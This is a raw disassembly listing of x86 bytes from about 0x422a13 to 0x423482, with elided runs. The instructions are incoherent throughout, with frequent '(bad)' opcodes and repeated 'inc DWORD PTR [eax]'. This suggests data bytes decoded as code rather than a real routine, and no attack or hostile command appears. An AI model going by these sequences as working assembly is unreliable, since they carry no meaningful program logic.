  422a13:	inc    DWORD PTR [eax]
  422a15:	test   eax,edi
  422a17:	inc    DWORD PTR [eax]
  422a19:	xor    esi,0xfb9800ff
  422a1f:	inc    DWORD PTR [eax]
  422a21:	pushf  
  422a22:	sti    
  422a23:	inc    DWORD PTR [eax]
  422a25:	fwait
  422a26:	sti    
  422a27:	inc    DWORD PTR [eax]
  422a29:	pushf  
  422a2a:	sti    
  422a2b:	inc    DWORD PTR [eax]
  422a2d:	sahf   
  422a2e:	sti    
  422a2f:	inc    DWORD PTR [eax]
  422a31:	mov    ds:0xa900fffc,al
  422a36:	(bad)  
  422a37:	call   FWORD PTR [edx]
  422a39:	mov    bl,0xfb
  422a3b:	rcr    DWORD PTR [ebp+0x3f5d9],cl
	...
  422a61:	add    BYTE PTR [eax],al
  422a63:	add    BYTE PTR [ebx],ch
  422a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a66:	rep stos DWORD PTR es:[edi],eax
  422a68:	add    BYTE PTR [esi-0x6bff0006],dl
  422a6e:	clc    
  422a6f:	inc    DWORD PTR [eax]
  422a71:	nop
  422a72:	clc    
  422a73:	inc    DWORD PTR [eax]
  422a75:	(bad)  
  422a76:	idiv   edi
  422a78:	add    BYTE PTR [edi-0x6eff0009],cl
  422a7e:	clc    
  422a7f:	inc    DWORD PTR [eax]
  422a81:	mov    bh,al
  422a83:	inc    DWORD PTR [eax]
  422a85:	xor    bh,0xff
  422a88:	add    BYTE PTR [eax+0x7400fff8],al
  422a8e:	hlt    
  422a8f:	inc    DWORD PTR [eax]
  422a91:	push   0xffffffed
  422a93:	inc    DWORD PTR [eax]
  422a95:	fs jmp 0xe6a22b9a
  422a9b:	inc    DWORD PTR [eax]
  422a9d:	pop    edi
  422a9e:	in     eax,0xff
  422aa0:	add    BYTE PTR [edi-0x1b],bl
  422aa3:	inc    DWORD PTR [eax]
  422aa5:	popa   
  422aa6:	out    0xff,eax
  422aa8:	add    BYTE PTR [ebx-0x19],ah
  422aab:	inc    DWORD PTR [eax]
  422aad:	fs jmp 0xeaa82bb2
  422ab3:	inc    DWORD PTR [eax]
  422ab5:	imul   ebp,ebx,0xec6a00ff
  422abb:	inc    DWORD PTR [eax]
  422abd:	ins    BYTE PTR es:[edi],dx
  422abe:	in     eax,dx
  422abf:	inc    DWORD PTR [eax]
  422ac1:	outs   dx,DWORD PTR ds:[esi]
  422ac2:	out    dx,al
  422ac3:	inc    DWORD PTR [eax]
  422ac5:	jb     0x422ab7
  422ac7:	inc    DWORD PTR [eax]
  422ac9:	ja     0x422abd
  422acb:	inc    DWORD PTR [eax]
  422acd:	xor    esi,0xf98900ff
  422ad3:	inc    DWORD PTR [eax]
  422ad5:	mov    edi,ebx
  422ad7:	inc    DWORD PTR [eax]
  422ad9:	cmp    eax,0xffffffff
  422adc:	add    BYTE PTR [edx-0x6aff0008],cl
  422ae2:	stc    
  422ae3:	inc    DWORD PTR [eax]
  422ae5:	xchg   ebx,eax
  422ae6:	stc    
  422ae7:	inc    DWORD PTR [eax]
  422ae9:	xchg   ebx,eax
  422aea:	clc    
  422aeb:	inc    DWORD PTR [eax]
  422aed:	xchg   esi,eax
  422aee:	stc    
  422aef:	inc    DWORD PTR [eax]
  422af1:	popf   
  422af2:	sti    
  422af3:	inc    DWORD PTR [eax]
  422af5:	mov    ds:0xbc4bfffd,al
  422afa:	test   DWORD PTR [ecx+0x0],0x0
	...
  422b24:	pop    ecx
  422b25:	mov    dl,0xee
  422b27:	pop    ebp
  422b28:	add    BYTE PTR [ecx-0x70ff0008],dl
  422b2e:	idiv   bh
  422b30:	add    BYTE PTR [ecx-0x78ff000b],cl
  422b36:	hlt    
  422b37:	inc    DWORD PTR [eax]
  422b39:	mov    ch,dh
  422b3b:	inc    DWORD PTR [eax]
  422b3d:	mov    dh,dh
  422b3f:	inc    DWORD PTR [eax]
  422b41:	jns    0x422b36
  422b43:	inc    DWORD PTR [eax]
  422b45:	imul   ebp,ebx,0xffffffff
  422b48:	add    BYTE PTR [ebp+ebx*8-0x1],bl
  422b4c:	add    BYTE PTR [edi-0x28],dl
  422b4f:	inc    DWORD PTR [eax]
  422b51:	pop    eax
  422b52:	fdivr  st,st(7)
  422b54:	add    BYTE PTR [ebp-0x25],bl
  422b57:	inc    DWORD PTR [eax]
  422b59:	pusha  
  422b5a:	(bad)  
  422b5c:	add    BYTE PTR [esi-0x20],bl
  422b5f:	inc    DWORD PTR [eax]
  422b61:	pop    edi
  422b62:	jecxz  0x422b63
  422b64:	add    BYTE PTR [edx-0x1a],ah
  422b67:	inc    DWORD PTR [eax]
  422b69:	gs call 0xe9a92c6e
  422b6f:	inc    DWORD PTR [eax]
  422b71:	push   0x6c00ffea
  422b76:	in     al,dx
  422b77:	inc    DWORD PTR [eax]
  422b79:	ins    DWORD PTR es:[edi],dx
  422b7a:	in     al,dx
  422b7b:	inc    DWORD PTR [eax]
  422b7d:	outs   dx,BYTE PTR ds:[esi]
  422b7e:	in     al,dx
  422b7f:	inc    DWORD PTR [eax]
  422b81:	ins    DWORD PTR es:[edi],dx
  422b82:	in     al,dx
  422b83:	inc    DWORD PTR [eax]
  422b85:	imul   ebp,ecx,0xffffffff
  422b88:	add    BYTE PTR [edi-0x19],ah
  422b8b:	inc    DWORD PTR [eax]
  422b8d:	data16 in al,0xff
  422b90:	add    BYTE PTR [edx-0x20],ah
  422b93:	inc    DWORD PTR [eax]
  422b95:	fs in  al,0xff
  422b98:	add    BYTE PTR [ebx-0x12],dh
  422b9b:	inc    DWORD PTR [eax]
  422b9d:	mov    eax,edi
  422b9f:	inc    DWORD PTR [eax]
  422ba1:	mov    ?,eax
  422ba3:	inc    DWORD PTR [eax]
  422ba5:	mov    esi,ebp
  422ba7:	inc    DWORD PTR [eax]
  422ba9:	mov    ebp,?
  422bab:	inc    DWORD PTR [eax]
  422bad:	xchg   edx,eax
  422bae:	idiv   edi
  422bb0:	add    BYTE PTR [ecx-0x62ff0007],bl
  422bb6:	sti    
  422bb7:	push   DWORD PTR [edi+eax*8-0xd]
  422bbb:	cmp    eax,0x0
	...
  422be4:	outs   dx,DWORD PTR ds:[esi]
  422be5:	mov    bh,0xe8
  422be7:	pop    ds
  422be8:	add    al,0x8e
  422bea:	hlt    
  422beb:	test   BYTE PTR [eax],0x88
  422bee:	cmc    
  422bef:	inc    DWORD PTR [eax]
  422bf1:	xor    dl,0xff
  422bf4:	add    BYTE PTR [edi-0xf],bh
  422bf7:	inc    DWORD PTR [eax]
  422bf9:	xor    edx,0xef7800ff
  422bff:	inc    DWORD PTR [eax]
  422c01:	pop    ecx
  422c02:	fdivr  st,st(7)
  422c04:	add    BYTE PTR [edi+eax*8-0x1],cl
  422c08:	add    BYTE PTR [ecx-0x36],dl
  422c0b:	inc    DWORD PTR [eax]
  422c0d:	pop    ebx
  422c0e:	aam    0xff
  422c10:	add    BYTE PTR [edx-0x25],ah
  422c13:	inc    DWORD PTR [eax]
  422c15:	addr16 (bad) 
  422c18:	add    BYTE PTR [ebx-0x1c],ch
  422c1b:	inc    DWORD PTR [eax]
  422c1d:	arpl   bx,sp
  422c1f:	inc    DWORD PTR [eax]
  422c21:	pusha  
  422c22:	jecxz  0x422c23
  422c24:	add    BYTE PTR [ebx-0x1a],ah
  422c27:	inc    DWORD PTR [eax]
  422c29:	callw  0x2d2c
  422c2d:	push   0x6b00ffe9
  422c32:	jmp    0x422c33
  422c34:	add    BYTE PTR [ebp-0x14],ch
  422c37:	inc    DWORD PTR [eax]
  422c39:	jo     0x422c28
  422c3b:	inc    DWORD PTR [eax]
  422c3d:	jno    0x422c2d
  422c3f:	inc    DWORD PTR [eax]
  422c41:	jno    0x422c2f
  422c43:	inc    DWORD PTR [eax]
  422c45:	outs   dx,BYTE PTR ds:[esi]
  422c46:	jmp    0xff:0xe86c00ff
  422c4d:	fs loope 0x422c4f
  422c50:	add    BYTE PTR [ecx-0x2b],bl
  422c53:	inc    DWORD PTR [eax]
  422c55:	dec    edi
  422c56:	retf   0xff
  422c59:	dec    ebx
  422c5a:	(bad)  
  422c5b:	inc    DWORD PTR [eax]
  422c5d:	pop    ebp
  422c5e:	(bad)  
  422c60:	add    BYTE PTR [edi-0xf],bh
  422c63:	inc    DWORD PTR [eax]
  422c65:	xchg   esp,esi
  422c67:	inc    DWORD PTR [eax]
  422c69:	xchg   esp,esi
  422c6b:	inc    DWORD PTR [eax]
  422c6d:	(bad)  
  422c6e:	idiv   bh
  422c70:	add    BYTE PTR [eax+edi*8-0x85fec01],dl
  422c77:	fst    QWORD PTR [edx+0x7f0cf]
	...
  422ca5:	add    BYTE PTR [eax],al
  422ca7:	add    BYTE PTR [ebx],ah
  422ca9:	xchg   esi,eax
  422caa:	out    dx,eax
  422cab:	mov    ebp,0xfff38300
  422cb0:	add    BYTE PTR [edi+ebp*8-0x1],bh
  422cb4:	add    BYTE PTR [eax-0x13],bh
  422cb7:	inc    DWORD PTR [eax]
  422cb9:	ja     0x422ca8
  422cbb:	inc    DWORD PTR [eax]
  422cbd:	push   edi
  422cbe:	into   
  422cbf:	inc    DWORD PTR [eax]
  422cc1:	inc    ecx
  422cc2:	mov    ah,0xff
  422cc4:	add    BYTE PTR [ebp-0x3f],cl
  422cc7:	inc    DWORD PTR [eax]
  422cc9:	pop    eax
  422cca:	into   
  422ccb:	inc    DWORD PTR [eax]
  422ccd:	pop    ebp
  422cce:	aam    0xff
  422cd0:	add    BYTE PTR [edx-0x26],ah
  422cd3:	inc    DWORD PTR [eax]
  422cd5:	addr16 (bad) 
  422cd8:	add    BYTE PTR [ebx+eiz*8-0x1],ch
  422cdc:	add    BYTE PTR [ebp-0x1d],ah
  422cdf:	inc    DWORD PTR [eax]
  422ce1:	popa   
  422ce2:	jecxz  0x422ce3
  422ce4:	add    BYTE PTR [ebx-0x1a],ah
  422ce7:	inc    DWORD PTR [eax]
  422ce9:	addr16 jmp 0xeaab2dee
  422cef:	inc    DWORD PTR [eax]
  422cf1:	ins    BYTE PTR es:[edi],dx
  422cf2:	in     al,dx
  422cf3:	inc    DWORD PTR [eax]
  422cf5:	outs   dx,DWORD PTR ds:[esi]
  422cf6:	in     al,dx
  422cf7:	inc    DWORD PTR [eax]
  422cf9:	jb     0x422ce8
  422cfb:	inc    DWORD PTR [eax]
  422cfd:	je     0x422ced
  422cff:	inc    DWORD PTR [eax]
  422d01:	je     0x422cf0
  422d03:	inc    DWORD PTR [eax]
  422d05:	jb     0x422cf3
  422d07:	inc    DWORD PTR [eax]
  422d09:	ins    DWORD PTR es:[edi],dx
  422d0a:	call   0xe0a62e0e
  422d0f:	inc    DWORD PTR [eax]
  422d11:	pop    ecx
  422d12:	aam    0xff
  422d14:	add    BYTE PTR [ebp-0x3a],cl
  422d17:	inc    DWORD PTR [eax]
  422d19:	inc    ebx
  422d1a:	mov    bh,0xff
  422d1c:	add    BYTE PTR [esi],bh
  422d1e:	mov    cl,0xff
  422d20:	add    BYTE PTR [edx-0x30],bl
  422d23:	inc    DWORD PTR [eax]
  422d25:	je     0x422d12
  422d27:	inc    DWORD PTR [eax]
  422d29:	jne    0x422d15
  422d2b:	inc    DWORD PTR [eax]
  422d2d:	xor    cl,0xff
  422d30:	add    BYTE PTR [esi-0x54c50009],cl
  422d36:	repz popf 
	...
  422d68:	inc    esp
  422d69:	mov    eax,ds:0x800070e9
  422d6e:	repnz inc DWORD PTR [eax]
  422d71:	jns    0x422d61
  422d73:	inc    DWORD PTR [eax]
  422d75:	jae    0x422d62
  422d77:	inc    DWORD PTR [eax]
  422d79:	imul   esp,ebx,0xffffffff
  422d7c:	add    BYTE PTR [esi],bh
  422d7e:	lods   al,BYTE PTR ds:[esi]
  422d7f:	inc    DWORD PTR [eax]
  422d81:	inc    eax
  422d82:	scas   al,BYTE PTR es:[edi]
  422d83:	inc    DWORD PTR [eax]
  422d85:	push   ecx
  422d86:	(bad)  
  422d87:	inc    DWORD PTR [eax]
  422d89:	push   esi
  422d8a:	int3   
  422d8b:	inc    DWORD PTR [eax]
  422d8d:	pop    esp
  422d8e:	sar    edi,cl
  422d90:	add    BYTE PTR [edx-0x27],ah
  422d93:	inc    DWORD PTR [eax]
  422d95:	data16 fdivp st(7),st
  422d98:	add    BYTE PTR [ebx-0x1d],ch
  422d9b:	inc    DWORD PTR [eax]
  422d9d:	gs in  eax,0xff
  422da0:	add    BYTE PTR [ebp-0x1b],bl
  422da3:	inc    DWORD PTR [eax]
  422da5:	pop    edi
  422da6:	jmp    0xeba42eaa
  422dab:	inc    DWORD PTR [eax]
  422dad:	fs in  eax,dx
  422daf:	inc    DWORD PTR [eax]
  422db1:	push   0x6b00ffee
  422db6:	out    dx,eax
  422db7:	inc    DWORD PTR [eax]
  422db9:	outs   dx,BYTE PTR ds:[esi]
  422dba:	lock inc DWORD PTR [eax]
  422dbd:	jb     0x422daf
  422dbf:	inc    DWORD PTR [eax]
  422dc1:	je     0x422db2
  422dc3:	inc    DWORD PTR [eax]
  422dc5:	je     0x422db5
  422dc7:	inc    DWORD PTR [eax]
  422dc9:	outs   dx,DWORD PTR ds:[esi]
  422dca:	jmp    0xdea52ece
  422dcf:	inc    DWORD PTR [eax]
  422dd1:	pop    eax
  422dd2:	sar    edi,1
  422dd4:	add    BYTE PTR [ebp-0x3d],cl
  422dd7:	inc    DWORD PTR [eax]
  422dd9:	inc    esp
  422dda:	mov    dh,0xff
  422ddc:	add    BYTE PTR [esi],dh
  422dde:	mov    ds:0xac3f00ff,al
  422de3:	inc    DWORD PTR [eax]
  422de5:	pop    edi
  422de6:	(bad)  
  422de8:	add    BYTE PTR [edx-0x2a],bl
  422deb:	inc    DWORD PTR [eax]
  422ded:	fs loopne 0x422def
  422df0:	add    BYTE PTR [eax-0x13],bh
  422df3:	call   FWORD PTR [ebx-0x52]
  422df6:	call   0x422e49
	...
  422e27:	add    BYTE PTR [ebp-0x4e],ch
  422e2a:	in     al,0x28
  422e2c:	add    al,BYTE PTR [ecx+0x7800faf0]
  422e32:	out    dx,al
  422e33:	inc    DWORD PTR [eax]
  422e35:	jo     0x422e20
  422e37:	inc    DWORD PTR [eax]
  422e39:	push   0xffffffe3
  422e3b:	inc    DWORD PTR [eax]
  422e3d:	cmp    ah,BYTE PTR [ebx-0x54c0ff01]
  422e43:	inc    DWORD PTR [eax]
  422e45:	push   eax
  422e46:	sar    edi,0x0
  422e49:	push   esi
  422e4a:	retf   0xff
  422e4d:	pop    ebx
  422e4e:	sar    bh,cl
  422e50:	add    BYTE PTR [ebp-0x26],bl
  422e53:	inc    DWORD PTR [eax]
  422e55:	(bad)  
  422e56:	(bad)  
  422e58:	add    al,0x6f
  422e5a:	loop   0x422e5b
  422e5c:	sbb    BYTE PTR [esi-0x1f],dh
  422e5f:	push   DWORD PTR [edx]
  422e61:	jl     0x422e3e
  422e63:	call   FWORD PTR [ecx-0x6c]
  422e66:	(bad)  
  422e68:	push   esi
  422e69:	xchg   ebx,eax
  422e6a:	(bad)  
  422e6c:	xor    BYTE PTR [ecx-0x65a3001d],0xdc
  422e73:	push   DWORD PTR [ebp-0x56]
  422e76:	jecxz  0x422e77
  422e78:	inc    ebp
  422e79:	xchg   edx,eax
  422e7a:	(bad)  
  422e7c:	inc    edx
  422e7d:	xchg   ebx,eax
  422e7e:	out    0xff,al
  422e80:	adc    eax,0x1ffe97f
  422e85:	jbe    0x422e73
  422e87:	inc    DWORD PTR [eax]
  422e89:	push   0xffffffea
  422e8b:	inc    DWORD PTR [eax]
  422e8d:	pop    esi
  422e8e:	(bad)  
  422e90:	add    BYTE PTR [ebp-0x32],dl
  422e93:	inc    DWORD PTR [eax]
  422e95:	dec    ebx
  422e96:	sar    bh,0x0
  422e99:	inc    ebx
  422e9a:	mov    bl,0xff
  422e9c:	add    BYTE PTR ds:0x3a00ff9d,dh
  422ea2:	mov    ds:0xd15500ff,eax
  422ea7:	inc    DWORD PTR [eax]
  422ea9:	push   ebp
  422eaa:	sar    edi,1
  422eac:	add    BYTE PTR [ebx+ebx*8-0x1],bl
  422eb0:	push   es
  422eb1:	imul   ebx,edi,0xcb9656ea
  422eb7:	adc    DWORD PTR [eax],eax
	...
  422ee5:	add    BYTE PTR [eax],al
  422ee7:	add    BYTE PTR [edi-0x48],bh
  422eea:	loopne 0x422eef
  422eec:	push   ss
  422eed:	xchg   bl,ch
  422eef:	rol    BYTE PTR [eax],1
  422ef1:	jbe    0x422ee2
  422ef3:	inc    DWORD PTR [eax]
  422ef5:	outs   dx,DWORD PTR ds:[esi]
  422ef6:	jmp    0xff:0xe46800ff
  422efd:	inc    edi
  422efe:	mov    ch,0xff
  422f00:	add    BYTE PTR [ecx],bh
  422f02:	mov    eax,ds:0xbf4e00ff
  422f07:	inc    DWORD PTR [eax]
  422f09:	push   ecx
  422f0a:	retf   0x5ff
  422f0d:	pop    esi
  422f0e:	sar    bh,1
  422f10:	pop    esi
  422f11:	xchg   esi,eax
  422f12:	(bad)  
  422f13:	(bad)  
  422f14:	jp     0x422eb7
  422f16:	retf   0xcaff
  422f19:	aam    0xdc
  422f1b:	inc    ebx
  422f1d:	mov    dh,0xff
  422f20:	in     al,0xe2
  422f22:	fdivp  st(7),st
  422f24:	aad    0xcd
  422f26:	ret    0xebff
  422f29:	out    0xe0,eax
  422f2b:	(bad)  
  422f2c:	fcmovbe st,st(2)
  422f2e:	(bad)  
  422f2f:	(bad)  
  422f30:	jmp    0x422f19
  422f32:	loope  0x422f33
  422f34:	fnop   
  422f36:	(bad)  
  422f39:	in     eax,0xdf
  422f3b:	dec    edx
  422f3d:	lds    edi,FWORD PTR [esi-0x22232501]
  422f43:	call   FWORD PTR [ebp-0x70003f50]
  422f49:	mov    cl,0xd4
  422f4b:	push   DWORD PTR [edx]
  422f4d:	ja     0x422f1d
  422f4f:	inc    DWORD PTR [edx]
  422f51:	push   ebp
  422f52:	retf   
  422f53:	inc    DWORD PTR [eax]
  422f55:	inc    esi
  422f56:	mov    edi,0xaf4100ff
  422f5b:	inc    DWORD PTR [eax]
  422f5d:	xor    ebx,DWORD PTR [eax-0x56c2ff01]
  422f63:	inc    DWORD PTR [eax]
  422f65:	dec    esi
  422f66:	leave  
  422f67:	inc    DWORD PTR [eax]
  422f69:	push   esp
  422f6a:	sar    edi,1
  422f6c:	add    BYTE PTR [ecx-0x25],bl
  422f6f:	call   FWORD PTR [esi]
  422f71:	jae    0x422f47
  422f73:	test   eax,0x0
	...
  422fac:	cmp    dl,BYTE PTR [ebp+0x740085e5]
  422fb2:	out    dx,eax
  422fb3:	inc    DWORD PTR [eax]
  422fb5:	outs   dx,DWORD PTR ds:[esi]
  422fb6:	jmp    0x422fb7
  422fb8:	add    BYTE PTR [ebp-0x1e],ah
  422fbb:	inc    DWORD PTR [eax]
  422fbd:	dec    edi
  422fbe:	(bad)  
  422fbf:	inc    DWORD PTR [eax]
  422fc1:	aaa    
  422fc2:	sahf   
  422fc3:	inc    DWORD PTR [eax]
  422fc5:	dec    ecx
  422fc6:	mov    ebx,0xbb743cff
  422fcb:	inc    ecx
  422fcd:	leave  
  422fce:	sar    edi,1
  422fd0:	(bad)
  422fd3:	jmp    ebp
  422fd5:	loope  0x422fb3
  422fd7:	dec    esi
  422fd9:	retf   0xffc3
  422fdc:	in     eax,0xe3
  422fde:	loope  0x422fdf
  422fe0:	leave  
  422fe1:	mov    dl,0xff
  422fe4:	in     al,0xe3
  422fe6:	loopne 0x422fe7
  422fe8:	into   
  422fe9:	int3   
  422fea:	enter  0xe6ff,0xe5
  422fee:	loop   0x422fef
  422ff0:	iret   
  422ff1:	int    0xc8
  422ff3:	jmp    ebp
  422ff5:	in     al,0xe1
  422ff7:	dec    ebx
  422ff9:	leave  
  422ffa:	(bad)  
  422ffb:	jmp    edx
  422ffd:	loope  0x422fdd
  422fff:	inc    esi
  423001:	ret    0xffbd
  423004:	loopne 0x422fe3
  423006:	fcos   
  423008:	ret    
  423009:	mov    ebx,0xd8daffb0
  42300e:	aam    0xff
  423010:	mov    bl,BYTE PTR [ecx+0x632fffab]
  423016:	mov    dl,0xff
  423018:	add    BYTE PTR [ebx],bh
  42301a:	stos   DWORD PTR es:[edi],eax
  42301b:	inc    DWORD PTR [eax]
  42301d:	xor    DWORD PTR [edi+edi*8-0x57c600],edx
  423024:	add    BYTE PTR [ebx-0x39],cl
  423027:	inc    DWORD PTR [eax]
  423029:	push   ebx
  42302a:	sar    bh,cl
  42302c:	add    BYTE PTR [ecx-0x25],bl
  42302f:	push   DWORD PTR [ebx]
  423031:	jnp    0x422ffa
  423033:	bound  eax,QWORD PTR [eax]
	...
  423069:	add    BYTE PTR [eax],al
  42306b:	add    BYTE PTR [esi-0x5f],dl
  42306e:	loopne 0x4230a8
  423070:	add    BYTE PTR [edi-0x11],dh
  423073:	inc    BYTE PTR [eax]
  423075:	jno    0x423064
  423077:	inc    DWORD PTR [eax]
  423079:	gs loop 0x42307b
  42307c:	add    BYTE PTR [ebx-0x32],dl
  42307f:	inc    DWORD PTR [ecx]
  423081:	cmp    BYTE PTR [ebx-0x5f8eaf01],ah
  423087:	call   esi
  423089:	aam    0xce
  42308b:	(bad)  
  42308c:	mov    edx,0xdcffaeb5
  423091:	fcmovnu st,st(1)
  423093:	inc    edx
  423095:	sar    DWORD PTR [esi-0x1f1e1d01],0xff
  42309c:	int3   
  42309d:	retf   
  42309e:	(bad)  
  42309f:	jmp    ebx
  4230a1:	loope  0x423082
  4230a3:	dec    esp
  4230a5:	retf   0xffc5
  4230a8:	out    0xe4,al
  4230aa:	loop   0x4230ab
  4230ac:	ror    dh,1
  4230ae:	leave  
  4230af:	jmp    edi
  4230b1:	in     eax,0xe3
  4230b3:	dec    edi
  4230b5:	int3   
  4230b6:	(bad)  
  4230b7:	jmp    ebp
  4230b9:	jecxz  0x42309c
  4230bb:	dec    ecx
  4230bd:	mov    cl,0xff
  4230c0:	loopne 0x4230a1
  4230c2:	fdiv   st(7),st
  4230c4:	mov    esi,0xd9ffb8bc
  4230c9:	fcom   st(6)
  4230cb:	push   DWORD PTR [ebx-0x2a00524f]
  4230d1:	ror    ch,cl
  4230d3:	jmp    DWORD PTR [edx+0x3cff969e]
  4230d9:	pop    esi
  4230da:	xchg   edi,eax
  4230db:	inc    DWORD PTR [eax]
  4230dd:	sub    eax,0x3c00ff95
  4230e2:	lods   eax,DWORD PTR ds:[esi]
  4230e3:	inc    DWORD PTR [eax]
  4230e5:	dec    ebx
  4230e6:	leave  
  4230e7:	inc    DWORD PTR [eax]
  4230e9:	push   ebx
  4230ea:	aad    0xff
  4230ec:	add    ebx,DWORD PTR [edi+edx*8-0xc]
  4230f0:	inc    edx
  4230f1:	cmp    BYTE PTR [edx+0x1c],0x0
	...
  42312c:	je     0x4230de
  42312e:	fld    QWORD PTR ds:0xdaeb7f10
  423134:	add    BYTE PTR [edx-0x11],dh
  423137:	inc    DWORD PTR [eax]
  423139:	addr16 in al,0xff
  42313c:	add    BYTE PTR [eax-0x28],bl
  42313f:	call   DWORD PTR [esi]
  423141:	dec    edi
  423142:	stos   BYTE PTR es:[edi],al
  423143:	inc    ebp
  423145:	ret    
  423146:	mov    esi,0xa3a9abff
  42314b:	call   edi
  42314d:	(bad)  
  42314e:	aam    0xff
  423150:	mov    esp,0xdfffb6ba
  423155:	(bad)  
  423157:	dec    ecx
  423159:	enter  0xffc4,0xe5
  42315d:	in     al,0xe2
  42315f:	dec    edx
  423161:	enter  0xffc3,0xe5
  423165:	jecxz  0x423147
  423167:	call   eax
  423169:	int    0xc8
  42316b:	jmp    edi
  42316d:	out    0xe3,al
  42316f:	call   ecx
  423171:	into   
  423172:	retf   0xe6ff
  423175:	in     eax,0xe2
  423177:	dec    ebp
  423179:	retf   0xffc6
  42317c:	jecxz  0x42315f
  42317e:	(bad)  
  423180:	mov    bl,0xbe
  423183:	(bad)  
  423184:	fstp   st(4)
  423186:	(bad)  
  423188:	mov    ecx,0xd6ffb3b7
  42318d:	aad    0xd3
  42318f:	jmp    DWORD PTR [edi-0x33005e5b]
  423195:	retf   0xffc6
  423198:	add    DWORD PTR [ecx+0x390aff80],0x3f00ff96
  4231a2:	mov    bh,0xff
  4231a4:	add    BYTE PTR [ebx+ecx*8-0x1],cl
  4231a8:	add    BYTE PTR [ebx-0x27],dl
  4231ab:	call   DWORD PTR ds:0xbdcd65
	...
  4231ed:	add    BYTE PTR [eax],al
  4231ef:	add    BYTE PTR [esi],dh
  4231f1:	(bad)  
  4231f2:	jecxz  0x42317d
  4231f4:	add    BYTE PTR [edx-0xf],dh
  4231f7:	inc    DWORD PTR [eax]
  4231f9:	push   0x5b00ffe8
  4231fe:	fdivp  st(7),st
  423200:	inc    edi
  423201:	jge    0x4231cd
  423203:	inc    DWORD PTR [ebp-0x2f00817d]
  423209:	iret   
  42320a:	int    0xff
  42320c:	mov    bl,0xb1
  42320e:	lods   eax,DWORD PTR ds:[esi]
  42320f:	(bad)  
  423210:	(bad)  
  423212:	fcos   
  423214:	(bad)
  423218:	loop   0x4231fb
  42321a:	loopne 0x42321b
  42321c:	iret   
  42321d:	int    0xc9
  42321f:	jmp    ebx
  423221:	loop   0x423203
  423223:	dec    esi
  423225:	retf   
  423226:	(bad)  
  423227:	jmp    edi
  423229:	out    0xe3,al
  42322b:	call   esp
  42322d:	ror    esp,1
  42322f:	(bad)  
  423230:	call   0xd342161b
  423235:	iret   
  423236:	retf   0xe5ff
  423239:	in     al,0xe1
  42323b:	dec    edx
  42323d:	mov    edx,0xdddfe1ff
  423243:	(bad)  
  423244:	mov    edi,0xdaffb8bd
  423249:	fcom   st(6)
  42324b:	push   DWORD PTR [ecx-0x2f005552]
  423251:	iret   
  423252:	int3   
  423253:	call   FWORD PTR [ebx-0x49006f69]
  423259:	mov    bh,0xb9
  42325b:	dec    DWORD PTR [ecx]
  42325d:	mov    ds:0xbf4200ff,eax
  423263:	inc    DWORD PTR [eax]
  423265:	dec    ebp
  423266:	iret   
  423267:	inc    DWORD PTR [eax]
  423269:	push   esp
  42326a:	(bad)  
  42326c:	sub    ch,BYTE PTR [esi-0x46]
  42326f:	popa   
	...
  4232b0:	xchg   ebp,eax
  4232b1:	ret    0xae6
  4232b4:	and    eax,0x4e4ae487
  4232b9:	cdq    
  4232ba:	loope  0x423311
  4232bc:	sub    DWORD PTR [eax+0x7a2457e1],ecx
  4232c2:	into   
  4232c3:	pop    ecx
  4232c4:	mov    dh,0xb7
  4232c6:	mov    bh,0xea
  4232c8:	mov    eax,ds:0xd6ff989e
  4232cd:	aad    0xd3
  4232cf:	(bad)  
  4232d0:	mov    ebx,0xdfffb5b9
  4232d5:	(bad)  
  4232d7:	dec    edx
  4232d9:	enter  0xffc4,0xe6
  4232dd:	in     eax,0xe2
  4232df:	dec    esp
  4232e1:	retf   0xffc5
  4232e4:	out    0xe4,al
  4232e6:	loope  0x4232e7
  4232e8:	ror    bh,cl
  4232ea:	retf   0xe8ff
  4232ed:	out    0xe4,al
  4232ef:	call   ebx
  4232f1:	ror    bl,1
  4232f3:	jmp    edi
  4232f5:	out    0xe3,al
  4232f7:	dec    edi
  4232f9:	int3   
  4232fa:	enter  0xe3ff,0xe2
  4232fe:	(bad)  
  423300:	mov    bl,0xbe
  423303:	(bad)  
  423304:	(bad)  
  423306:	fcos   
  423308:	mov    eax,0xd5ffb1b5
  42330d:	aam    0xd1
  42330f:	jmp    DWORD PTR [edx+eiz*4-0x3a370063]
  423316:	ret    0x6fff
  423319:	ja     0x42339a
  42331b:	lds    ebx,FWORD PTR [ecx]
  42331d:	pop    esi
  42331e:	mov    al,0x5d
  423320:	or     al,0x5b
  423322:	mov    ah,0x57
  423324:	sub    DWORD PTR [edi-0x49],esp
  423327:	push   esp
  423328:	adc    eax,0x4d44be5f
  42332d:	sub    DWORD PTR [edi+0x4],0x0
	...
  423384:	mov    DWORD PTR [ecx-0x39377a88],eax
  42338a:	(bad)  
  42338b:	push   DWORD PTR [ecx-0x25005451]
  423391:	(bad)  
  423393:	inc    esp
  423395:	sar    DWORD PTR [ebp-0x201e1c01],0xff
  42339c:	ror    dh,1
  42339e:	leave  
  42339f:	jmp    esi
  4233a1:	in     eax,0xe2
  4233a3:	call   eax
  4233a5:	int    0xc8
  4233a7:	(bad)  
  4233a8:	call   0xd7421793
  4233ad:	ror    ah,cl
  4233af:	(bad)  
  4233b0:	jmp    0xd542189c
  4233b5:	ror    bl,1
  4233b7:	jmp    esi
  4233b9:	in     eax,0xe2
  4233bb:	dec    esp
  4233bd:	enter  0xffc3,0xe1
  4233c1:	(bad)  
  4233c3:	(bad)  
  4233c4:	mov    edi,0xd9ffb7bc
  4233c9:	xlat   BYTE PTR ds:[ebx]
  4233ca:	aad    0xff
  4233cc:	mov    al,0xad
  4233ce:	test   al,0xff
  4233d0:	into   
  4233d1:	int3   
  4233d2:	retf   0x8dff
  4233d5:	mov    DWORD PTR [ebp-0x4f494501],eax
  4233db:	jle    0x4233dd
	...
  423441:	add    BYTE PTR [eax],al
  423443:	add    BYTE PTR [edx+esi*4-0x7572a952],dh
  42344a:	test   edi,edi
  42344c:	aam    0xd3
  42344e:	sar    bh,1
  423450:	mov    ecx,0xe0ffb2b6
  423455:	(bad)  
  423457:	call   ecx
  423459:	retf   0xffc1
  42345c:	in     al,dx
  42345d:	call   0xd41f3444
  423462:	(bad)  
  423463:	(bad)  
  423464:	jmp    0x42344d
  423466:	loopne 0x423467
  423468:	fcom   st(3)
  42346a:	retf   0xeaff
  42346d:	call   0xd41a3457
  423472:	int    0xff
  423474:	jmp    0x42345e
  423476:	jecxz  0x423477
  423478:	fcmovbe st,st(1)
  42347a:	(bad)  
  42347d:	in     eax,0xde
  42347f:	call   edx
  423481:	(bad)  
  423482:	mov    ebx,0xd8dde1ff
